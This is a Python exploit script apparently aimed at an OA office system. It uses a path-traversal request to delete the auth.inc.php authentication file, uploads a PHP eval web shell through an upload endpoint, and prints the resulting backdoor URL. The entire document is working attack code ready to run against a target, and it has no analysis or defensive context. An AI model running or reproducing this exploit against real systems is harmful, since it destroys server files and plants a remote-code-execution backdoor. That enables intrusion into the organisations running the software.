
import requests
import sys
def exp(target,password):
    payload="<?php eval($_POST['%s']);?>" % password
    print("[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA")
    input("Press enter to continue")
    print("[*]Deleting auth.inc.php....")
    
    url=target+"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
    requests.get(url=url)
    print("[*]Checking if file deleted...")
    url=target+"/inc/auth.inc.php"
    page=requests.get(url=url).text
    if 'No input file specified.' not in page:
        print("[-]Failed to deleted auth.inc.php")
        exit(-1)
    print("[+]Successfully deleted auth.inc.php!")
    print("[*]Uploading payload...")
    url=target+"/general/data_center/utils/upload.php?action=upload&filetype=tql&repkid=/.<>./.<>./.<>./"
    files = {'FILE1': ('%s.php' % password, payload)}
    requests.post(url=url,files=files)
    url=target+"/_%s.php" % password
    page=requests.get(url=url).text
    if 'No input file specified.' not in page:
        print("[+]Filed Uploaded Successfully")
        print("[+]URL:",url)
    else:
        print("[-]Failed to upload file")

if __name__=="__main__":
    if len(sys.argv)<3:
        print("usage: python %s target backdoor_password" %__file__)
    else:
        target=sys.argv[1]
        password=sys.argv[2]
        exp(target,password)